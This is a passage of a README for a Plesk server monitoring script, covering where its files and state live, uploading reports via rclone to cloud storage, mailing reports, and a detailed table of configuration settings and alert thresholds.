- **First run:** if there is no configuration file at all and the script is *not* in a system folder (`/usr/local/sbin`, `/usr/local/bin`, `/usr/sbin`, …), the first run writes `plesk-server-report.conf` next to it (`chmod 600`, only in a folder that only root can change). It lists every setting with its default, commented out – the defaults apply until you change a line, and settings you leave commented out follow the defaults of later versions too. In a system folder nothing is written next to the script; `--init-config` writes the file on request (then to `/etc/plesk-server-report.conf`). `--init-config` never overwrites a configuration, and `--self-update` only replaces the script – your settings stay as they are. `--print-config` shows the template of the installed version, to compare it with your file.
- **State:** with the configuration next to the script, the state goes to `state/` next to it – unless an existing installation keeps its state in `/var/lib/plesk-server-report` (then it stays there and the report says how to move it, see below). `STATE_DIR` overrides both. The script marks its state folder and refuses a `STATE_DIR` that holds other files (`STATE_DIR=/root`, a typo), so its files never end up among others.
- **`first-report.txt`**, the report of the first run, next to the script; in the usual layout in `plesk-server-report-backup/`. Never replaced, also not when the state is reset.
- **Previous versions** kept by `--self-update`: `backup/` next to the script (`plesk-server-report-backup/` when the script is in a system folder or uses `/etc/plesk-server-report.conf`), not in the state folder – deleting the state never loses them. `BACKUP_DIR` overrides it, `SCRIPT_RETENTION` (default 5) says how many.

**Switching from the usual layout:** move the script, its configuration (if you have one), its state and the kept versions – without the state, the next run reads the logs again like a first run and reports what it knew as new.

```bash
rm /etc/cron.d/plesk-server-report                     # no run during the move
mkdir -m 700 /opt/plesk-server-report
mv /usr/local/sbin/plesk-server-report.sh /opt/plesk-server-report/
mv /etc/plesk-server-report.conf /opt/plesk-server-report/      # if it exists
mv /var/lib/plesk-server-report /opt/plesk-server-report/state
mv /usr/local/sbin/plesk-server-report-backup /opt/plesk-server-report/backup   # if it exists
/opt/plesk-server-report/plesk-server-report.sh --show-state | head -1   # State directory: /opt/plesk-server-report/state
echo '5 * * * * root /opt/plesk-server-report/plesk-server-report.sh' > /etc/cron.d/plesk-server-report
```
If your cron line is in root's crontab instead, change the path there (`crontab -e`) and skip the two `/etc/cron.d` lines.

---

## Storage for the reports

> ### ⚠️ Use a dedicated account
> Reports contain **IP addresses, mailbox names and email addresses** – personal data (GDPR!) and a map of your server's weak spots. Create a **separate account or bucket used only for these reports**, not your personal or company drive. This way:
> - a stolen rclone token on the server only exposes the reports,
> - anything (human or AI assistant) you give read access to sees the reports and nothing else,
> - you can delete everything in one go.
>
> Never share the folder with "anyone with the link".
>
> **No AI review? Then your own account can be fine,** as long as the token on the server is limited to the report files and the folder is never shared:
> - **Google Drive with scope `drive.file`:** rclone only sees files it created itself. A stolen token exposes the reports, not the rest of your drive. A folder in your own account is acceptable.
> - **S3/B2 with a bucket-limited key, or SFTP with a chrooted user:** same, the key only reaches the report bucket or directory.
> - **OneDrive or Nextcloud/WebDAV:** the token or app password usually grants access to the **whole** account. Keep a dedicated account here.
>
> As soon as an AI assistant (or anyone else) gets read access, use a dedicated account. Connectors typically see the entire account, not just one folder.

The upload target is the rclone remote in `REMOTE` (default `reports:server-reports/<hostname>`). After every run the script uploads `report-YYYYMMDD-HHMM.txt`, overwrites `latest.txt` and deletes reports older than `RETENTION_DAYS` (default 7). Set `REMOTE=""` to keep reports only locally (in `/var/lib/plesk-server-report/out`).

Install rclone with `apt install rclone` (Debian/Ubuntu) or `dnf install rclone` (RHEL-based, from EPEL). If your distribution's version is very old, see [rclone.org/install](https://rclone.org/install/).

### Option A: Google Drive (headless server)

1. Create a new Google account just for the reports.
2. On the server run `rclone config` and answer:

   | Prompt | Answer |
   |---|---|
   | `n/s/q>` | `n` (new remote) |
   | `name>` | `reports` |
   | `Storage>` | `drive` (Google Drive) |
   | `client_id>` / `client_secret>` | Enter (empty) works, but rclone's built-in client ID is shared by all rclone users worldwide and regularly runs into Google's rate limit (`Error 403 … rateLimitExceeded`, uploads fail). Recommended: [create your own client ID](https://rclone.org/drive/#making-your-own-client-id) and enter it here (free, about 10 minutes). |
   | `scope>` | **`drive.file`**: rclone can only see files it created itself, not the rest of the drive |
   | `service_account_file>` | Enter |
   | `Edit advanced config?` | `n` |
   | `Use web browser to automatically authenticate?` | **`n`**, the server has no browser |

3. rclone now prints a command like `rclone authorize "drive" "eyJ..."`. Run it **on your desktop** (install rclone there, e.g. `winget install Rclone.Rclone`, `brew install rclone`), log in **with the dedicated Google account** and allow access.
4. Copy the token printed on your desktop (`{"access_token":...}`) and paste it on the server at `config_token>`.
5. `Configure this as a Shared Drive?` → `n`, then `y` to save and `q` to quit.
6. Test:
   ```bash
   rclone mkdir reports:server-reports
   rclone lsd reports:
   ```

Deleted reports are removed permanently, not moved to the Drive trash.

### Option B: Microsoft OneDrive

Same flow as Google Drive: `rclone config` → `onedrive`, answer `n` to auto config, run `rclone authorize "onedrive"` on your desktop and log in with a **dedicated Microsoft account**. The token usually grants access to the whole OneDrive, which makes the dedicated account even more important. See [rclone.org/onedrive](https://rclone.org/onedrive/).

> **In the commands below, replace everything in `<ANGLE BRACKETS>`** with your provider's values. They are placeholders, not working defaults.

### Option C: S3-compatible object storage (AWS S3, Backblaze B2, Wasabi, Hetzner, IONOS, …)

The cleanest option security-wise: an access key that can **only write into one bucket**.

```bash
rclone config create reports s3 provider Other \
  access_key_id <ACCESS_KEY_ID> secret_access_key <SECRET_ACCESS_KEY> \
  endpoint <https://S3-ENDPOINT-OF-YOUR-PROVIDER> region <REGION>
```

- Your provider's documentation lists the endpoint and region (for AWS itself use `provider AWS` and omit `endpoint`).
- With S3 the remote path **must start with the bucket name**. Put this in `/etc/plesk-server-report.conf`: `REMOTE="reports:<BUCKET>/${HOST}"`
- Create a dedicated bucket and a key restricted to that bucket.
- Ideally the key has **no delete permission**. Then set `RETENTION_DAYS=0` and let a **bucket lifecycle rule** delete objects after 7 days.
- Keys without permission to create buckets need `RCLONE_S3_NO_CHECK_BUCKET=true` (e.g. as a line `export RCLONE_S3_NO_CHECK_BUCKET=true` in the config file).
- Backblaze B2 natively: `rclone config create reports b2 account <KEY_ID> key <APPLICATION_KEY>` with an application key limited to the bucket. The remote path also starts with the bucket here: `REMOTE="reports:<BUCKET>/${HOST}"`

### Option D: SFTP (Hetzner Storage Box, your own NAS, another server)

```bash
# 1. key pair for the upload, without passphrase (cron has to use it unattended)
ssh-keygen -t ed25519 -N '' -f /root/.ssh/report_upload
# 2. put /root/.ssh/report_upload.pub into ~/.ssh/authorized_keys of <SFTP_USER> on the target
# 3. create the remote
rclone config create reports sftp host <SFTP_HOST> port <PORT, usually 22> user <SFTP_USER> \
  key_file /root/.ssh/report_upload
rclone lsd reports:
```

Use a dedicated user that is chrooted or limited to one directory (e.g. a Storage Box sub-account). The remote path is relative to that user's home directory, so the default `REMOTE="reports:server-reports/${HOST}"` works as is.

### Option E: Nextcloud / WebDAV

```bash
rclone config create reports webdav vendor nextcloud \
  url https://<YOUR-NEXTCLOUD>/remote.php/dav/files/<NEXTCLOUD_USER> \
  user <NEXTCLOUD_USER> pass "$(rclone obscure '<APP_PASSWORD>')"
```

Use a dedicated Nextcloud user and an app password (*Personal settings → Security → Devices & sessions*). For other WebDAV servers use `vendor other` and your server's WebDAV URL.

---

## Reports by mail

Instead of – or in addition to – the upload, the script can mail the reports.

> **Recommended: a mailbox on this server** (e.g. an address of one of your own domains hosted here). Postfix then delivers the mail locally: the reports never travel over the internet, and no cloud storage or other provider gets them (see [Privacy](#privacy-gdpr)). You read them like any other mail, encrypted over IMAP. An address at another provider (Gmail, Microsoft 365, …) works too, but then every report is sent over the internet and stored at that provider – the same data protection questions as with an upload.

Set the address in `/etc/plesk-server-report.conf`:

```bash
REPORT_MAIL_TO="admin@example.com"       # a mailbox on this server; several: space-separated
REPORT_MAIL="alerts summary"             # the default – see the table
REMOTE=""                                # only if you want no upload at all
```

What is mailed: `REPORT_MAIL` takes one or more of these words, separated by spaces, e.g. `"alerts summary"` (default), `"summary"` (only the daily mail) or `"all summary"`:

| Word | Mail |
|---|---|
| `alerts` | the full report as soon as a run has an alert that was not mailed in the last 24 hours. An alert that stays (the same mailbox sending too much in the next run, only with other figures) is not mailed again every run; the daily summary still lists it. Subject: `<host>: WARNING (n, new: m) – <first new alert>` |
| `summary` | `summary.txt` once a day, with the first run from `REPORT_MAIL_HOUR` on (default 6, server time) – also on quiet days, so a missing mail is a sign that something is wrong |
| `all` | every report (with an hourly cron job: 24 mails a day) |

A normal run that finds nothing new sends **no mail** – and the summary only goes out once a day. So right after the setup, test it:

```bash
plesk-server-report.sh --test-mail
```

It mails the newest report to `REPORT_MAIL_TO` at once and follows it in the mail log for up to 20 seconds:

```
Sending report-20261108-1217.txt to admin@example.com (from plesk-server-report@host.example) …
Accepted by the local mail server. Delivery (from the mail log):
  admin@example.com: sent (delivered via plesk_virtual service)
Delivered. If the mail is not in the inbox, look in the spam folder (see README: whitelist the sender).
```

With a mailbox that doesn't exist on this server it says `NOT delivered – Plesk: Unknown user: … (the mail was discarded, no bounce)`. Watch out: Postfix itself logs such a mail as `status=sent`, because it only hands it over to Plesk's delivery (`relay=plesk_virtual`); Plesk then drops it silently. The script reads Plesk's own log line (`postfix-local`) to tell. At another provider, most mail servers reject an unknown address right away – `--test-mail` shows their reply. Some accept the mail first and send a bounce later; that bounce comes back to the sender address, and the next normal run raises an alert for it. `--test-mail` changes nothing in the state: it works any time, also after the daily summary was sent. (Postfix only – with qmail it can't follow the mail and asks you to check the mailbox.)

- The mails are sent with the local `sendmail` (Postfix or qmail, both part of Plesk) from `plesk-server-report@<host name>` (`REPORT_MAIL_FROM`). The script leaves its own mails out of the mail figures of the next report.
- **Did the mail arrive?** The next report checks the mail log: if a report mail was deferred, bounced or dropped by Plesk (wrong address, mailbox missing or full), it raises an alert with the reason. If `sendmail` refuses a mail or is missing, the next report says so in its notes (` i `).
- **The mailbox must really be hosted here.** If a domain exists in Plesk with mail service switched on, but its MX record points elsewhere (e.g. Microsoft 365), Postfix still delivers to the Plesk mailbox, which nobody reads. Use an address whose mail is actually read on this server, or switch off the mail service of that domain in Plesk.
- **Address at another provider:** the sender `plesk-server-report@<host name>` is only signed with DKIM if the host name is a domain in Plesk with mail service. Otherwise set `REPORT_MAIL_FROM` to an address of one of your domains on this server with SPF, DKIM and DMARC, or the receiving provider may reject the mails or file them as spam.
- **Put the sender on the spam filter's whitelist – important.** The reports quote what attackers try: paths like `/wp-admin/`, `/wp-login.php`, `/wp-content/uploads/x.php` and names of sensitive files. SpamAssassin has rules for links to hacked WordPress sites (`URI_WP_HACKED_2`, `URI_WPADMIN`) and counts exactly these as spam signals. On the author's server, the summary of a quiet day already scored 4.1 of the 6.5 points at which Plesk treats a mail as spam. On a day with many attacks – when the mail matters most – it can end up in the spam folder or be deleted. The script can't avoid this, the paths are the content of the report. So add `plesk-server-report@<host name>` (or your `REPORT_MAIL_FROM`) to the whitelist of the receiving mailbox – in Plesk: *Mail* → click the mailbox → *Spam Filter* → open the *advanced settings* → *White list*. A whitelist trusts the sender address, which others could forge; Plesk signs the mails with DKIM, so keep DMARC for the server's domain at `quarantine` or `reject` and forged mails fail it.
- `MASK_MAILBOXES=1` pseudonymises the mails like the uploads.
- **The report watches the mail server it is sent through.** If Postfix hangs, the disk is full or the server is down, no mail arrives – and no mail says so. Notice when the daily summary is missing. With the upload and a daily AI review this gap doesn't exist: the review reports a missing `summary.txt`.
- The mails pile up in the mailbox and are part of the Plesk backup. Delete old ones, e.g. after 30 days, in line with the other retention periods.
- Test runs (`--no-upload`, `--only`) send no mails; `--test-mail` sends one on purpose.

---

## Configuration

**You don't need to change anything here** – the defaults fit a typical Plesk server with an hourly cron job. Override a default only when a report tells you to (e.g. a threshold that is too low for your server) in `/etc/plesk-server-report.conf`, or `plesk-server-report.conf` next to the script (bash syntax; it survives script updates; `--init-config` writes one with every setting):

```bash
REMOTE="reports:server-reports/myhost"   # "" = local only
RETENTION_DAYS=7                         # 0 = never delete remotely
WEB_IGNORE_DOMAINS="legacy.example old.example"   # no web alerts, still listed
UPLOADS_PHP_IGNORE='/uploads/mailchimp-for-wp/debug-log\.php$|/uploads/my-plugin/'
WARN_IPS_PER_MAILBOX=6
WARN_MAILS_PER_SENDER=300
ALLOWED_COUNTRIES="DE AT CH"              # alert on logins from other countries
GEO_TRUSTED_ORGS="Microsoft"             # no country alerts for this operator (see notes)
```

All thresholds apply **per run**. With the hourly cron job that means per hour; if you run the script less often, raise them accordingly. The defaults with comments are also at the top of the script.

| Variable | Default | Meaning |
|---|---|---|
| `WARN_MAILS_PER_SENDER` | 150 | recipients per envelope sender, counting only mail sent **from** this server (after a mailbox login or by a local script). Incoming mail, e.g. a shop sending many invoices to one of your mailboxes, is listed under *Top senders* but raises no alert |
| `WARN_MAILS_PER_SASL` | 150 | mails submitted by one authenticated mailbox |
| `WARN_IPS_PER_MAILBOX` | 4 | distinct client IPs per mailbox (raise it if many users roam between networks) |
| `WARN_FROM_MISMATCH` | 10 | mails with a sender domain different from the login's domain |
| `WARN_MAILS_PER_SCRIPT` | 100 | mails via PHP `mail()`/sendmail per subscription |
| `WARN_DEFERRED` | 100 | deferred deliveries |
| `WARN_QUEUE` | 200 | messages in the Postfix queue |
| `WATCH_RECIPIENT_DOMAINS` | empty | recipient domains whose deliveries are business-critical, e.g. `"invoices.example.com"` when a customer forwards invoices to an accounting service. Every deferral or bounce to these domains (and their subdomains) raises an alert with the remote reply; the report shows sent / deferred / bounced for each |
| `WARN_BLOCKLIST` | 1 | remote rejections or deferrals mentioning a blocklist, bad reputation, spam or rate limiting (wording of Gmail, Microsoft, Apple iCloud, Yahoo, GMX/web.de and T-Online included). Up to three examples with recipient domain and reply are listed below the count, then *What to do, by who rejected*: the list or provider recognised in the replies and how to get the IP removed (removal is always free). Rejections of mail forwarded by Plesk (sender rewritten with SRS) are not counted here: they are listed apart as *Rejections of forwarded mail*, per forwarding address, target and original sender – not sent by a customer, but forwarded spam still counts against your IP, see `WARN_FORWARD_REJECT` |
| `WARN_FORWARD_REJECT` | 10 | rejections of forwarded mail (sender rewritten with SRS) per run, `0` = never alert. The alert names the forwarding address (from Plesk's forwarding settings) and the original sender: set its spam filter to delete spam, or to move it with a copy kept – see the daily check `forwarding` |
| `WARN_AUTH_FAIL` | 300 | failed mail logins (SMTP + IMAP/POP3) and, separately, failed webmail logins. Raise it if routine brute-force noise (already handled by fail2ban) triggers it regularly |
| `WARN_MAILBOX_PCT` | 95 | daily: warn when a mailbox is filled to x % of its size limit, `0` = off. A full mailbox that rejects mail is reported every run regardless |
| `WARN_MAILBOX_UNLIMITED_GB` | 5 | daily: warn when a mailbox without size limit holds more than x GB – it can't become full, but fills the disk and the backups. Measured with `du` on its Maildir folder. `0` = off; the report line still names the largest one |
| `WARN_DSN` | 1 | delivery confirmations (DSN "delivered") sent to other servers – alert from this many in a run, `0` = off |
| `WARN_OLD_PASSWORD` | 3 | failed logins of one mailbox from an IP that logged in successfully before (a device with an outdated password?) – alert from this many in a run, `0` = off |
| `DNSBL_LISTS` | Spamhaus ZEN, SpamCop, PSBL | IP blocklists checked for the server IP; `clean` only if the list answers its test entry, see [Notes](#notes-and-limitations) |
| `WARN_LOAD_FACTOR` | 1.5 | alert when the 5-minute load exceeds CPU cores × this factor |
| `WARN_MEM_AVAIL_PCT` | 10 | alert when available RAM drops below this percentage |
| `WARN_DISK_PCT` | 85 | alert when a filesystem has used more than this percentage of its space or of its inodes |
| `WARN_CPU_USER_PCT` | 80 | CPU of one system user in the snapshot |
| `WARN_5XX_PER_DOMAIN` / `WARN_PHP_FATAL` | 100 / 20 | web errors per domain |
| `WARN_LOGIN_POSTS` | 300 | POSTs to `wp-login.php`/`xmlrpc.php` per domain |
| `WEB_IGNORE_DOMAINS` | empty | space-separated domains without web alerts (still listed in the report) |
| `IGNORE_FAILED_UNITS` | empty | space-separated systemd units that raise no alert when they have failed, e.g. `"backup-old.service"`; patterns like `backup-*` work, `.service` may be left out. They are still listed in the report (*Failed units without an alert*). Fix a failed unit if you can – only ignore one you know is harmless |
| `IGNORE_CRASHES` | empty | space-separated programs whose crashes raise no alert: `nginx`, `plesk-panel`, `apache`, `php-fpm`, or the name the kernel log gives (e.g. `"php-fpm"` for a PHP extension known to crash). Still listed (*Crashes without an alert*) |
| `CRASH_LOGS` | error logs of nginx, the Plesk panel's nginx (`sw-cp-server`), Apache (Debian and RHEL paths), PHP-FPM (Plesk's and the distribution's) | logs searched for workers that died by a fatal signal; patterns allowed. The kernel log (journal) is always read |
| `RARE_MODULES` | `sctp dccp tipc rds` | daily: kernel modules of network protocols few servers use – loaded: warning; loadable: a recommendation with the command to block them. `""` = check off |
| `FIREWALL_CHECK` | 1 | daily: databases and the Plesk installer reachable from outside (see [Notes](#notes-and-limitations)). `0` = off |
| `WARN_INSTALLER_OPEN` | 1 | daily: a recommendation when the Plesk Firewall allows the Plesk installer (port 8447) from everywhere. `0` = only the line – e.g. when you update from changing addresses on purpose |
| `SSHUSERS_CHECK` | 1 | daily: SSH access of the Plesk system users – full shells and keys files the account can change itself (see [Notes](#notes-and-limitations)). `0` = off |
| `ALLOWED_FULL_SHELL_USERS` | (empty) | daily: Plesk system users with a full shell on purpose (e.g. a deputy admin), separated by spaces – no warning for the shell itself; their keys file is still checked |
| `PHP_CHECK` | 1 | daily: PHP versions of the domains, installed and in service plans, with the end of their security support (see [Notes](#notes-and-limitations)). `0` = off |
| `PHP_EOL` | (empty) | daily: your own end-of-support dates, e.g. `"8.6=2030-12-31 8.7=2031-12-31"` – win over php.net and the built-in table, e.g. for a version the script doesn't know yet, or a date php.net moved |
| `PHP_EOL_ONLINE` | 1 | daily: fetch the dates from php.net's list of branches (`https://www.php.net/releases/states.php`) at most once a day; kept in the state folder for when php.net can't be reached. `0` = never (servers without internet access) |
| `WARN_RC_LOCAL` | 1 | daily: a warning when `/etc/rc.local` runs commands at boot – deprecated, and not the default on any current distribution (see [Notes](#notes-and-limitations)). `0` = only the line in the report |
| `UPLOADS_PHP_IGNORE` | Mailchimp for WP's debug log | regex of legitimate PHP files inside `wp-content/uploads` |
| `WARN_LOGIN_DETAIL` | 20 | show login-attack details for domains with at least this many login POSTs |
| `WARN_LOGIN_BRUTE_FAILS` | 5 | alert when an IP logs in to WordPress successfully after at least this many failures |
| `GEOIP` | 1 | 0 switches geolocation off |
| `ALLOWED_COUNTRIES` | empty | ISO country codes, e.g. `"DE AT CH"`. Successful logins from other countries raise an alert. Empty = annotate only, no alerts |
| `GEO_TRUSTED_ORGS` | empty | regex of network operators exempt from country alerts, e.g. `"Microsoft\|Google"` |
| `MAIL_TRUSTED_LOGINS` | empty | known mailbox logins from outside `ALLOWED_COUNTRIES`, as `mailbox=IP` or `mailbox=NET/BITS`, several separated by spaces, e.g. `"info@example.com=198.51.100.20"` – for servers running customers' applications (shop, CRM, website elsewhere) that send through a mailbox. No country alert for exactly that pair; the login is still listed, marked `[trusted]` |
| `GEO_DATACENTER_RE` | list of cloud/hosting providers | operators marked as `[datacenter]` |
| `MAILAUTH_CHECK` | 1 | daily SPF/DKIM/DMARC check, 0 = off (needs `dig`, package `bind9-dnsutils`) |
| `FORWARD_CHECK` | 1 | daily check of mail forwarding to other providers (Plesk), 0 = off |
| `MAILAUTH_SHOW_ALL` | 0 | 1 = list every domain, 0 = only domains with findings |
| `MAILAUTH_IGNORE_DOMAINS` | empty | space-separated domains to skip |
| `MAILAUTH_RESOLVER` | `1.1.1.1` | DNS resolver for the daily DNS checks (SPF/DKIM/DMARC, server and domain DNS, HTTPS), `""` = system resolver (see notes); blocklists use `BLOCKLIST_RESOLVER` |
| `PAR_JOBS` | 4 | domains checked at the same time by the daily DNS checks (mail authentication, domain DNS) – they wait for name servers, not the CPU; `1` = one after the other |
| `DKIM_KEY_DIR` / `DKIM_SELECTOR` | `/etc/domainkeys` / `default` | where Plesk keeps the DKIM private keys (`<dir>/<domain>/<selector>`) and the selector it signs with |
| `MAILNAMES_DIR` | `/var/qmail/mailnames` | Plesk mailbox directory (`<dir>/<domain>/<mailbox>`) |
| `SERVER_DNS_CHECK` | 1 | PTR / HELO / IPv6 check, 0 = off |
| `CHECK_IPV6` | `auto` | `auto` = only if the server has a global IPv6 and Postfix uses it (`inet_protocols`), `1` = always, `0` = never |
| `MAIL_TLS_NAME` | server host name | the host name your customers enter in their mail clients. The mail certificate must be valid for it |
| `MAIL_TLS_PORTS` | `25 465 587 993 995` | ports whose certificate is checked (25/587 via STARTTLS, 143/110 also possible) |
| `DOMAIN_DNS_CHECK` | 1 | per-domain A/AAAA, CAA, DNSSEC and domain-blocklist check, 0 = off |
| `DOMAIN_BLOCKLISTS` | `dbl.spamhaus.org multi.surbl.org multi.uribl.com` | domain blocklists, queried like the IP blocklists (`BLOCKLIST_RESOLVER`) |
| `BLOCKLIST_RESOLVER` | auto | DNS resolver for all blocklist lookups: `127.0.0.1` if a resolver answers there (on Plesk: BIND), else the system resolver; an IP, or `system` to force the system resolver |
| `HTTPS_CHECK` | 1 | daily HSTS and http→https redirect check, 0 = off |
| `ATTACK_STATS` | 1 | hourly attack-pattern, sensitive-file, traffic-peak and ModSecurity statistics |
| `WARN_REQ_PER_MIN` | 600 | alert when a domain's busiest minute exceeds this many requests |
| `WARN_DISTRIBUTED_IPS` | 100 | alert when one URL (static files excluded) is requested by this many different IPs in one run |
| `EXPOSED_FILES_CHECK` / `EXPOSED_FILES_IGNORE` | 1 / SQL files shipped with software | daily scan of the document roots for exposed files. The ignore regex skips schema/upgrade `.sql` files bundled with WordPress plugins, osTicket and phpBB by default. Extend it, don't replace it, unless you want those back |
| `WEBSHELL_CHECK` / `WEBSHELL_IGNORE` | 1 / empty | daily scan of recently changed PHP files for backdoor code and of `.htaccess`/`.user.ini`/`php.ini` for settings that run attacker code, regex of paths to ignore |
| `WEBSHELL_FIRST_DAYS` | 7 | the first scan covers files changed within this many days; later scans cover files changed since the previous scan |
| `PERSISTENCE_CHECK` | 1 | hourly check of SSH keys, accounts, sudo, cron jobs, autostart files, suspicious processes and listening ports (see [Notes](#notes-and-limitations)), 0 = off |
| `PERSISTENCE_IGNORE` | empty | regex on the text of findings of that check to leave out, e.g. `'/tmp/known-tool'` for a tool you run from `/tmp` on purpose |
| `WARN_CERT_DAYS` | 14 | certificate expiry warning |
| `WARN_BACKUP_HOURS` | 26 | maximum age of the last Plesk backup |
| `REMOTE` | `reports:server-reports/<host>` | rclone `remote:path` for the upload, `""` = keep reports locally only |
| `RETENTION_DAYS` / `LOCAL_KEEP_DAYS` | 7 / 7 | delete reports older than this many days remotely / locally (0 = never). Remote deletion is permanent, not into the trash. `latest.txt` and `summary.txt` are replaced as new files on every run instead of being overwritten, so Google Drive keeps no older versions of them. Keep at least one day locally, `summary.txt` is built from the local reports |
| `JSON_REPORT` | 0 | 1 = also write `report-YYYYMMDD-HHMM.json` and `summary.json` (and upload them with `latest.json`), see [JSON report](#json-report-optional-json_report1). The text reports stay the same |
| `SUMMARY` / `SUMMARY_HOURS` | 1 / 24 | write and upload `summary.txt`, built from the local reports of the last `SUMMARY_HOURS` (see [Reading the reports](#reading-the-reports)), 0 = off |
| `MAX_RUNTIME` | 50 | minutes after which an unattended (cron) run is stopped, together with every command it started. Keep it below the cron interval. The next run reports the aborted one as an alert. 0 = no limit |
| `CMD_TIMEOUT` | 120 | seconds per external command that can hang (`plesk db`, `fail2ban-client`, `postqueue`, `journalctl`, `systemctl`, `apt-get`, `rclone`). A timeout raises an alert `Script: command timed out …` |
| `FIND_TIMEOUT` | 600 | seconds per file-system scan of the web folders (`find`, `grep`), e.g. if a document root contains a dead network mount. After a timeout the scan is repeated next time instead of being marked as done |
| `IMAP_COUNTRY_KEEP_DAYS` | 30 | days after which a mailbox's foreign country is forgotten if no IMAP/POP3 login came from there; the next login from that country alerts again (see [Notes](#notes-and-limitations)). 0 = never forget |
| `KNOWN_MAIL_IP_DAYS` | 30 | days to remember client IPs of successful mail logins – alert when fail2ban bans one of them |
| `KNOWN_LOGIN_IP_DAYS` | 90 | days to remember an SSH/Plesk login IP without a login from it (0 = never). After that, the next login from it raises "unknown IP" again |
| `UPDATE_CHECK` | 1 | once a day, ask GitHub whether a newer release of the script exists and say so in the daily checks (info only, nothing is installed); 0 = no request |
| `BACKUP_DIR` | (empty) | where `--self-update` keeps the previous versions; empty: next to the script, `plesk-server-report-backup/` – or `backup/` in a one-folder installation |
| `SCRIPT_RETENTION` | 5 | how many previous versions `--self-update` keeps (at least 1, for `--rollback`) |
| `REPORT_MAIL_TO` | empty | mail the reports to this address (several: space-separated). Recommended: a mailbox on this server, so the reports never leave it. See [Reports by mail](#reports-by-mail). Empty = no mails |
| `REPORT_MAIL` | `alerts summary` | what is mailed, one or more words separated by spaces: `alerts` = the report when it has a new alert, `summary` = `summary.txt` once a day, `all` = every report. E.g. `"summary"` = only the daily mail |
| `REPORT_MAIL_HOUR` | 6 | the summary mail goes out with the first run from this hour on (server time, 0–23) |
| `REPORT_MAIL_FROM` | `plesk-server-report@<host>` | sender address of the mails |
| `MASK_MAILBOXES` | 0 | 1 = the uploaded and mailed reports show mail addresses pseudonymised (`mbx-4f2a91@example.com`); the local reports stay complete, `--decode` translates back. See [Privacy](#privacy-gdpr) |
| `MAX_LOG_MB` | 200 | read at most this many MB of new lines per log file and run, the newest part. Protects against huge logs after a long pause or a log that was truncated in place; the skipped part is mentioned in the report. 0 = no limit |
| `STATE_DIR` | `/var/lib/plesk-server-report` | log offsets, known login IPs, daily cache, local reports |
| `VHOST_LOGS` | `/var/www/vhosts/system` | Plesk per-domain log directories |
| `MAIL_LOG` | auto | mail log; default `/var/log/maillog` or `/var/log/mail.log`, else the systemd journal |
| `AUTH_LOG` | auto | log of SSH logins; default `/var/log/auth.log` or `/var/log/secure`, else the systemd journal |
| `PLESK_PANEL_LOG` | `/var/log/plesk/httpsd_access_log` | access log of the Plesk panel (port 8443), used to detect panel logins |
| `PLESK_ERROR_LOG` | `/var/log/plesk/panel.log` | Plesk's own log: failed panel logins with login name, failed certificate renewals (section `PLESK PANEL LOG`) |
| `ROUNDCUBE_LOG_DIR` | auto | Roundcube log directory, default `/var/log/plesk-roundcube` or `/usr/share/psa-roundcube/logs` |
| `BACKUP_LOG_DIR` | auto | Plesk backup logs (`backup-*/backup.log`), default `/var/log/plesk/PMM`, `/usr/local/psa/PMM/logs` or `/opt/psa/PMM/logs` |
| `GEOIP_DIR` | `$STATE_DIR/geoip` | where the DB-IP Lite databases are stored |

---

## First run

- **PHP files in `wp-content/uploads`:** the first run lists all existing ones. Some plugins legitimately store PHP files there (the debug log of Mailchimp for WP is excluded by default – exclude single files, not whole plugin folders: a webshell is often put exactly there). Add your own to `UPLOADS_PHP_IGNORE`. Anything else deserves a look: this is the classic place for web shells.
- **IMAP/POP3 countries:** mailboxes already read from abroad at the first run are stored as known (`known_imap_countries`) without an alert.
- **Logins:** all IPs with a successful SSH/panel login in the current logs are stored as known (`/var/lib/plesk-server-report/known_login_ips`). Every later login from a new IP raises an alert once. Remove lines from that file to "forget" an IP.
- **SSH keys, accounts, sudo, cron jobs, autostart files, listening ports:** the first run stores what is there as the baseline (`/var/lib/plesk-server-report/baseline/`) without alerts – except cron jobs and autostart files with suspicious content and suspicious processes, which are reported right away. From then on every change is listed once.
- **To repeat the daily checks today:** `rm /var/lib/plesk-server-report/daily_date`. They also run again by themselves in the next run after the script or the configuration file changed, after packages were installed, or after a reboot – so a security update you installed with `apt upgrade`, and "reboot required" once you have rebooted, disappear from the report with the next run, not only the next day.
- **How long a run takes:** a normal run takes seconds. The run with the daily checks takes a few minutes – once a day after midnight, and right after an update or a change of the configuration (so a manual test run after `--self-update` is the slow one). Nearly all of that time is spent waiting for DNS servers and websites (DNS, certificates, HTTPS, mail authentication and exposed files of every domain), not computing: the run is niced and uses hardly any CPU or memory. Several `plesk-server-report.sh` processes in `top` are not parallel runs but subshells of the one run. The report says how long it took (`Run time:` at the end, `Daily checks took … (slowest: …)` under DAILY CHECKS). To see what a running run is doing right now: `cat /var/lib/plesk-server-report/running` – the last column is the current step, e.g. `daily: mailauth` or `upload`.
- **To run single checks right now**, e.g. after fixing a DNS record: `plesk-server-report.sh --only mailauth` (several: `--only mailauth,domaindns`; groups: `hourly`, `daily`, `all`; names: `--list`). The result is printed and nothing else happens: no upload, and log offsets, scan stamps and known login IPs stay as they are, so the next hourly run still sees everything. The on/off switches from the configuration (`MAILAUTH_CHECK` etc.) don't apply to checks named explicitly.
- **For a complete reset:** `rm -rf /var/lib/plesk-server-report` – the kept versions and `first-report.txt` stay (next to the script).
- **Cron:** as long as no cron line or systemd unit runs the script at its current path (the test run before you add it, or a cron line still pointing to an old path), the report says so at the end, with the line to add.

---

## Reading the reports

Every run uploads three kinds of files:

| File | Content |
|---|---|
| `report-YYYYMMDD-HHMM.txt` | the full report of one run (time in the server's time zone, usually UTC) |
| `latest.txt` | a copy of the newest report |
| `report-YYYYMMDD-HHMM.json`, `latest.json`, `summary.json` | only with `JSON_REPORT=1`: the same run and the same summary as JSON, see [JSON report](#json-report-optional-json_report1) |
| `summary.txt` | all reports of the last 24 hours condensed into one file, in the same themes as the reports: every run with its status (gaps are easy to spot), every alert with how often and when it was seen (grouped by theme, the critical ones first), mail and web totals, deliveries per provider, failed panel logins, fail2ban per jail, failed certificate renewals, peaks of load and RAM, the backup status of the newest report, every line of the sections that are normally empty (successful logins, changes of SSH keys, accounts, cron jobs and ports, suspicious processes, IMAP/POP3 logins from other countries, new PHP files in uploads, login ≠ from, webmail, WordPress attacks, traffic peaks, files served with 200) – and the newest results of the daily checks of each theme |

